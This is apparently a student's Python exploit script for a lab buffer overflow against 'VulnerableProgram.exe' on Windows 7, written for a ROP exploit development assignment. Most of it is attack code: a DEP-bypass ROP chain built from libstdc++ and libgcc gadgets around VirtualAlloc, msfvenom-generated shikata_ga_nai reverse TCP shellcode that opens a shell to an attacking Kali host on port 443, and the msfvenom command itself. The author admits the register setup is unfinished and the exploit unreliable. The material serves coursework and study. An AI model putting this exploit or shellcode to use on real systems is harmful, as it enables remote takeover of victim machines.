#----------------------------------------------------------------------------------------
# 
# Git: https://github.com/franky527/8042-a2-exploit/blob/main/README.adoc  
# File Location: C:\Documents and Settings\Administrator\Desktop\Sploit\Exploit1-VirtAll.py
# Exploit tested on the following configuraiton:
# Host Machine: Windows 7 Home Premium, Service Pack 1, 32-bit 
# Attacking Machine: Kali Linux 2023.3
# Control Panel > System and Security > System > Advanced > Performance - Settings > Data Execution Prevention (Turn on DEP for all application)
#
# Steps to launch exploit:
#	1) Using Command Prompt, run the exploit file; python Exploit1-VirtAll.py    
#   2) This python script will create the necessary "original_file.txt" which is used for testing the program
#	3) For testing and observation of the exploit, open Immunity Debugger 
#	4) Run VulnerableProgram.exe
#   5) The program will use the original_file.txt as input into it's file copy process, and run a buffer overflow
#	6) The shell code in this exploit payload will create a TCP shell on Port 443, to the attacking Kali machine on 198.168.100.5 
#	7) The exploit is confirmed when a shell is established from the Win7 victim, to the Kali machine (this is not a consistent result)
#
# The VirtualAlloc Win32 API was used in the Return Oriented Programming (ROP) Chain for this exploit
# https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
#
#   LPVOID VirtualAlloc(
#        [in, optional] LPVOID lpAddress,
#        [in]           SIZE_T dwSize,
#        [in]           DWORD  flAllocationType,
#        [in]           DWORD  flProtect
#   );
#
# This exploit will bypass Data Execution Prevention (DEP)
# The Windowx 7 machine can be set to "Turn on DEP for all programs and services"
#
# The PUSHAD technique was used to set the register values for execution:
#   EDI = ROP NOP (RETN)
#   ESI = Pointer to VirtualAlloc()
#   EBP = Pointer to JMP ESP
#   ESP = This is a pointer to the stack (EIP), that is automatically generated pointer to the shellcode once PUSHAD is called
#   EBX = dwSize setting to 0x00000201
#   EDX = NewProtect setting to 0x00000040
#   ECX = lpOldProtect = pointer to a write address
#   EAX = NOP
#   
#----------------------------------------------------------------------------------------
#

# Python module for string conversions
from struct import pack

# Exploit writes to the "original_file.txt" for use by the VulnerableProgram.exe
with open('original_file.txt', 'w') as f:
    
    # Junk to fill buffer, program is vulnerable to files > 2000 characters
    junk = 'A'*2028    
               
    # In finding EIP, this was confirmed through observation that EIP was being overwritten with the following buffer values
    # Both !mona patterns and pattern generator was used, but unsuccesssful in assisting to confirm #https://wiremask.eu/tools/buffer-overflow-pattern-generator/ 
    # f.write('A'*2028)
    # f.write('BBBB')
    
    # EIP is set to point to the stack
    eip = pack('L', 0x6d0cb804) # RETN

    #----------------------------------------------------------------------------------------
    
    # This message is crafted from finding the memory locations of related intructions to set the stack registers 
    # This is a Return Oriented Programming (ROP) chain, crafted to set the stack register values
    # This has considerd bad characters that will stop the shellcode from executing '\x00\x09\x0A\x0d\x1a'
    # The most valuable !mona files for identifying gadgets have been the rop_suggestions and validating with rop_chains files
    # Gadgets within the libgcc_s_sjlj-1.dll and libstdc++-6.dll as being no ASLR
    
    rop =''
 
    # Set ESI to VirtualAlloc()
    rop += pack('L', 0x6fe4bc48)  # POP ECX # RETN    ** [libstdc++-6.dll] ** 
    rop += pack('L', 0x76252341)  # Pointer to kernel32.VirtualProtect
    rop += pack('L', 0x6fe67710)  # MOV EAX,DWORD PTR DS:[ECX] # RETN    ** [libstdc++-6.dll] **      
    rop += pack('L', 0x6feff44f)  # PUSH EAX # POP ESI # POP EDI # POP EBP # RETN 0x08    ** [libstdc++-6.dll] ** 
    rop += pack('L', 0x41414141)  # Padding to compensate instruction
    rop += pack('L', 0x41414141)  # Padding to compensate instruction


    #Set EBP to JMP ESP
    rop += pack('L', 0x6febbe68)  # POP EBP # RETN    ** [libstdc++-6.dll] **  
    rop += pack('L', 0x41414141)  # Padding to compensate instruction
    rop += pack('L', 0x41414141)  # Padding to compensate instruction
    rop += pack('L', 0x6ff0d6c5)  # JMP ESP ** [libstdc++-6.dll] **       
    
    #Set ECX to any writable location
    rop += pack('L', 0x6fe4bc48)  # # POP ECX # RETN    ** [libstdc++-6.dll] ** 
    rop += pack('L', 0x6d0d67c0)  # Writable location [libgcc_s_sjlj-1.dll]
    
    # Set EDI to ROP NOP
    rop += pack('L', 0x6feba555)  # POP EDI # RETN    ** [libstdc++-6.dll] ** 
    rop += pack('L', 0x6d0cb804)  # RETN
    
    #Set EAX to NOP
    rop += pack('L', 0x6ff0e6b3)  # POP EAX # POP EBP # RETN    ** [libstdc++-6.dll] **
    rop += pack('L', 0x90909090)  # NOP
    rop += pack('L', 0x41414141)  # Padding to compensate instruction
    
    #---------- More complex values to set
    
    # Set EBX to 0x00000201
    rop += pack('L', 0x6fee06cc)  # POP EBX # RETN    ** [libstdc++-6.dll] ** 
    rop += pack('L', 0xFFFFFFFF)  # Set value for EBX
    rop += pack('L', 0x6fe50bc7)  # INC EBX # ADD AL,83 # RETN    ** [libstdc++-6.dll] **
    rop += pack('L', 0x6fe50bc7)  # INC EBX # ADD AL,83 # RETN    ** [libstdc++-6.dll] **     Value is 1
    # rop += pack('L', 0x6fe50bc7)  # Was thinking to INC EBX another 200 times to get to 201
        
    # Set EDX to 0x00000040   
    rop += pack('L', 0x6fe62d56)  # POP EDX # ADD ESP,28 # POP EBX # RETN    ** [libstdc++-6.dll] **
    rop += pack('L', 0xFFFFFFFF)  # Set value for EBX
    rop += pack('L', 0x6ff04d9b)  # INC EDX # RETN    ** [libstdc++-6.dll] **
    rop += pack('L', 0x6ff04d9b)  # INC EDX # RETN    ** [libstdc++-6.dll] **     Value is 1
    #rop += pack('L', 0x6ff04d9b)  # Was thinking to INC EDX another 39 times to get to 40 
   
    # the final PUSH AD assembly instruction to execute the intructions in the registers, in order  
    rop += pack('L', 0x6d0d32fd)  # # PUSHAD # OR EAX,1CC4836D # RETN    ** [libgcc_s_sjlj-1.dll] **

#--------------------------------------------------------------------------

	# The shell code is generated from kali 2023.3, msfvenom was used, and the output captured for the exploit file as buf
	# msfvenom -n 100 -p windows/shell_reverse_tcp -f python -a x86 --platform windows -b "\x00\x20\x0A\x0d\x1a" -e x86/shikata_ga_nai LHOST=192.168.100.05 LPORT=443 > reverse_tcp.sc
	# The shell code establishes a TCP shell to the attacking Kali machine on 198.168.100.5
    
    buf =  ""
    buf += "\x93\xfc\x92\x91\x40\x37\x41\x49\xfd\xf8\x3f\xf9"
    buf += "\x90\xfd\x42\x48\x4b\x9b\xfd\x90\x41\xfc\x92\x3f"
    buf += "\x3f\xd6\xf9\x4b\xd6\x90\x2f\x9f\xf5\x43\x98\x4a"
    buf += "\x91\x90\x90\x9b\xfd\x90\x37\xfc\x42\x91\x43\xfc"
    buf += "\x3f\x37\xf8\x98\x37\x49\x27\x43\xfd\x90\x49\x43"
    buf += "\x2f\x4a\x4b\x99\x9f\x3f\x42\x27\x93\x90\xfc\x9f"
    buf += "\xfc\x2f\x42\x40\x48\x41\xfd\x4b\x49\x92\x2f\x9b"
    buf += "\x40\xfd\xf9\x90\x9b\x48\x91\xf9\x3f\xf5\xfc\x98"
    buf += "\x9f\x40\xfd\x41\xdb\xca\xb8\xa6\xa2\x0f\x95\xd9"
    buf += "\x74\x24\xf4\x5d\x2b\xc9\xb1\x52\x31\x45\x17\x03"
    buf += "\x45\x17\x83\x63\xa6\xed\x60\x97\x4f\x73\x8a\x67"
    buf += "\x90\x14\x02\x82\xa1\x14\x70\xc7\x92\xa4\xf2\x85"
    buf += "\x1e\x4e\x56\x3d\x94\x22\x7f\x32\x1d\x88\x59\x7d"
    buf += "\x9e\xa1\x9a\x1c\x1c\xb8\xce\xfe\x1d\x73\x03\xff"
    buf += "\x5a\x6e\xee\xad\x33\xe4\x5d\x41\x37\xb0\x5d\xea"
    buf += "\x0b\x54\xe6\x0f\xdb\x57\xc7\x9e\x57\x0e\xc7\x21"
    buf += "\xbb\x3a\x4e\x39\xd8\x07\x18\xb2\x2a\xf3\x9b\x12"
    buf += "\x63\xfc\x30\x5b\x4b\x0f\x48\x9c\x6c\xf0\x3f\xd4"
    buf += "\x8e\x8d\x47\x23\xec\x49\xcd\xb7\x56\x19\x75\x13"
    buf += "\x66\xce\xe0\xd0\x64\xbb\x67\xbe\x68\x3a\xab\xb5"
    buf += "\x95\xb7\x4a\x19\x1c\x83\x68\xbd\x44\x57\x10\xe4"
    buf += "\x20\x36\x2d\xf6\x8a\xe7\x8b\x7d\x26\xf3\xa1\xdc"
    buf += "\x2f\x30\x88\xde\xaf\x5e\x9b\xad\x9d\xc1\x37\x39"
    buf += "\xae\x8a\x91\xbe\xd1\xa0\x66\x50\x2c\x4b\x97\x79"
    buf += "\xeb\x1f\xc7\x11\xda\x1f\x8c\xe1\xe3\xf5\x03\xb1"
    buf += "\x4b\xa6\xe3\x61\x2c\x16\x8c\x6b\xa3\x49\xac\x94"
    buf += "\x69\xe2\x47\x6f\xfa\xcd\x30\x0b\xff\xa5\x42\xd3"
    buf += "\xfe\x8e\xca\x35\x6a\xe1\x9a\xee\x03\x98\x86\x64"
    buf += "\xb5\x65\x1d\x01\xf5\xee\x92\xf6\xb8\x06\xde\xe4"
    buf += "\x2d\xe7\x95\x56\xfb\xf8\x03\xfe\x67\x6a\xc8\xfe"
    buf += "\xee\x97\x47\xa9\xa7\x66\x9e\x3f\x5a\xd0\x08\x5d"
    buf += "\xa7\x84\x73\xe5\x7c\x75\x7d\xe4\xf1\xc1\x59\xf6"
    buf += "\xcf\xca\xe5\xa2\x9f\x9c\xb3\x1c\x66\x77\x72\xf6"
    buf += "\x30\x24\xdc\x9e\xc5\x06\xdf\xd8\xc9\x42\xa9\x04"
    buf += "\x7b\x3b\xec\x3b\xb4\xab\xf8\x44\xa8\x4b\x06\x9f"
    buf += "\x68\x7b\x4d\xbd\xd9\x14\x08\x54\x58\x79\xab\x83"
    buf += "\x9f\x84\x28\x21\x60\x73\x30\x40\x65\x3f\xf6\xb9"
    buf += "\x17\x50\x93\xbd\x84\x51\xb6"

	#----------------------------------------------------------------------------------------
	# Remaining payload components                                       
    nop = "\x90"*100    # NOP Sled
    shellcode = buf     # The Shellcode
    junk2 = 'Z'*100     # Additional data after the shellcode to observe a clean payload, and no bad characters 
    
    #----------------------------------------------------------------------------------------
    # concatenating the payload together for execution:
    #   junk      =   2028 characters for buffer overflow
    #   eip       =   RETN instruction to start ROP chain
    #   rop       =   The set of ROP instructions to set the register values, including the selected WIN32 API
    #   nop       =   NOP Sled
    #   shellcode =   Shellcode
    #   junk2     =   Additional data after the shellcode
    
    payload = junk + eip + rop + nop + shellcode + junk2
        
    #---------------------------------------------------------------------------------------- 
    # Screen output with payload size 
    print("[i] Payload size: []", len(payload))
    
    # Write the exploit payload file
    f.write(payload)

# Screen output to confirm exploit file is generated
print('[1] Exploit file is generated')

#---------------------------------------------------------------------------
# LESSONS: from ROP Exploit Development Assignment 2
#
# 1) Other WIN APIs attempted for ROP Chains, but unsuccessfully: 
#       SetProcessDEPPolicy() was unsuccessful in Windows 7, but this also a known constraint on limited windows configurations - https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setprocessdeppolicy
#       VirtualProtect() was at a location with bad characters - https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
#       A lesson on the variances between targets and the techniques available
# 2) Overcoming secutity controls:
#       Data Execution Prevention (DEP) was overcome with the ROP exploit technique
#       ASLR on Windows7 was avoided by staying within non ASLR libraries. However with more time, this is of interest to further explore the vulnerabilities ASLR libraries.
#       Stack Canaries were not explored
# 3) The most valuable !mona files for identifying gadgets were the rop_suggestions and validating with rop_chains files:
#       There was still SIGNIFICANT time taken to step through the ROP chain for validaiton
#       There were still MANY MANY times of executing the exploit with Immunity Debugger with a starting breakpoint, and F7 step by step obervations of instructions being executed
#       Bad characters were an ongoing consideration, they can be difficult to spot and take time to realise as the cause of problem in a ROP chain            
#       Assigning values became an unresolvable issue in the end; the calculated instructions become too complex to resolve in time for submission
# 4) With more time, it would be of value to undertake more in depth comparisson of execution behaviour with modern WIN10 and Linux Environments, includig the 64-bit operating systems:
#       Some differences between WindowsXP and Windows7 have reinforced the objective of exploits to be written for differnt platforms and scenarios, so expecting this continues as additional platforms are used in comparrison
#       Overall, this has been a very challenging, and humbling experience..... but has definately built confidence to explore further; have discovered a lot of new interesting informaiton from the activity 
#
